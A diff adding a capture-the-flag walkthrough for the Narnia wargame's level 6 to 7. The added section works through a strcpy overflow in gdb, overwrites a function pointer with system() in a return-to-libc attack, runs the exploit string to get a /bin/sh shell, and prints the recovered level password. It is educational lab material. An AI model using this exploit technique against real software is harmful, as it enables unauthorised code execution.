@@ -173,8 +173,114 @@ neezocaeng
 neezocaeng
 
 ### level 6 -> 7
+When we inspect the program source code we find some anomalies and interesting things:  
+1. We import `stdio.h`, `stdlib.h` and `string.h`  
+  ```c
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <string.h>
+  ```
+2. Use of unsafe `strcpy` function to copy `arg[1]` and `arg[2]` to `b1` and `b2`  
+  ```c
+  strcpy(b1,argv[1]);
+  strcpy(b2,argv[2]);
+  ```
+3. We call `puts` function using function pointer `fb` with `b1` as argument  
+  ```c
+  int  (*fp)(char *)=(int(*)(char *))&puts, i;
+  ...
+  fp(b1);
+  ```
+So we can buffer overflow `b1` and `b2` to change fb to jump to our shell code, the problem is `b1` and `b2` are very small for shell code(only 8 bytes).  
+This is where the fact that we found that the program include `stdlib.h` turns out to be useful, we can than use Return-to-libc attack to jump to `system()` (that include in this lib) and start `/bin/sh` shell.  
+For this we need to set `b1` to overflow `fb` to `system()`.  
+The problem is we also need `b1` for argument for `system()`, and if we try to overflow `fb` to something like `('/bin/sh'<system() address>)` the `strcpy` function will copy only the `/bin/sh` to b1 (because it stop when he get to NULL terminator) (Later I realized that there is actually another problem and that is that `/bin/sh` will actually take 9 bytes and will "push" into the fb address first byte we are trying to override as well).  
+So what we will do is overflow `b1` to change `fb` to `system()` address, and then overflow `b2` to change `b1` to `/bin/sh`.  
+The steps for solve:  
+1. Find offset to `fb`
+2. Find `system()` address
+3. Create the argument exploit string
+4. Run it :)
+#### Find offset to `fb`:  
+```shell
+narnia6@narnia:/narnia$ gdb -q narnia6
+Reading symbols from narnia6...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485a8 <+0>:     push   %ebp
+   0x080485a9 <+1>:     mov    %esp,%ebp
+   0x080485ab <+3>:     push   %ebx
+   ...
+   0x080486d8 <+304>:   call   0x8048450 <setreuid@plt>
+   0x080486dd <+309>:   add    $0x8,%esp
+   0x080486e0 <+312>:   lea    -0x14(%ebp),%eax
+   0x080486e3 <+315>:   push   %eax
+   0x080486e4 <+316>:   mov    -0xc(%ebp),%eax
+   0x080486e7 <+319>:   call   *%eax                      <- this is fb(b1), so lets break here
+   0x080486e9 <+321>:   add    $0x4,%esp
+   0x080486ec <+324>:   push   $0x1
+   0x080486ee <+326>:   call   0x8048440 <exit@plt>
+   End of assembler dump.
+(gdb) break *main+319
+Breakpoint 1 at 0x80486e7
+(gdb) run AAAA BBBB
+Starting program: /narnia/narnia6 AAAA BBBB
 
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/x $eax
+0x8048430 <puts@plt>:   0x99c825ff                        <- We see that fb now point to puts()
+(gdb) x/40 $ebp-40
+0xffffd690:     0x080486dd      0x000036b6       0xffffd6a4      *0x42424242*      <- this is the BBBB in b2
+0xffffd6a0:     0xf7fc5300      *0x41414141*     0x08048700      *0x08048430*      <- this is AAAA in b1 and the 0x8048430 in fb()
+0xffffd6b0:     0x00000003      0x00000000       0x00000000      0xf7e2a286
+0xffffd6c0:     0x00000003      0xffffd754       0xffffd764      0x00000000
+0xffffd6d0:     0x00000000      0x00000000       0xf7fc5000      0xf7ffdc0c
+0xffffd6e0:     0xf7ffd000      0x00000000       0x00000003      0xf7fc5000
+0xffffd6f0:     0x00000000      0x59f3f73f       0x631afb2f      0x00000000
+0xffffd700:     0x00000000      0x00000000       0x00000003      0x080484a0
+0xffffd710:     0x00000000      0xf7fee710       0xf7e2a199      0xf7ffd000
+0xffffd720:     0x00000003      0x080484a0       0x00000000      0x080484c1
+```
+Lets try overflow `fb` address using `b1` and overflow start of `b1` using `b2`
+```shell
+(gdb) run $(python -c "print('A'*8 + 'XXXX' + ' ' + 'B'*8 + 'YYYY')")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia6 $(python -c "print('A'*8 + 'XXXX' + ' ' + 'B'*8 + 'YYYY')")
+
+Breakpoint 1, 0x080486e7 in main ()
+(gdb) x/40 $ebp-40
+0xffffd680:     0x080486dd      0x000036b6       0xffffd694       *0x42424242          <- start of b1
+0xffffd690:     0x42424242      0x59595959*      *0x41414100      0x58585858*          <- b1 overflow b2 and b1 overflow fb
+0xffffd6a0:     0x00000000      0x00000000       0x00000000       0xf7e2a286
+0xffffd6b0:     0x00000003      0xffffd744       0xffffd754       0x00000000
+0xffffd6c0:     0x00000000      0x00000000       0xf7fc5000       0xf7ffdc0c
+0xffffd6d0:     0xf7ffd000      0x00000000       0x00000003       0xf7fc5000
+0xffffd6e0:     0x00000000      0x5956a581       0x63bf4991       0x00000000
+0xffffd6f0:     0x00000000      0x00000000       0x00000003       0x080484a0
+0xffffd700:     0x00000000      0xf7fee710       0xf7e2a199       0xf7ffd000
+0xffffd710:     0x00000003      0x080484a0       0x00000000       0x080484c1
+(gdb) x/x $eax
+0x58585858:     Cannot access memory at address 0x58585858
+(gdb)
+```
+#### Find address of `system()`
+```c
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e4c850 <system>
+```
+#### Create the argument exploit string
+The exploit will be:   
+* arg[1] = `<8 byte padding><system() address>`
+* arg[1] = `<8 byte padding><'/bin/sh'>`
+#### Run
+```shell
+narnia6@narnia:/narnia$ ./narnia6 $(python -c "print('A'*8 + '\x50\xc8\xe4\xf7' + ' ' + 'B'*8 + '/bin/sh')")
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
+```
 **password:**
+ahkiaziphu
 
 
 ### level 7 -> 8
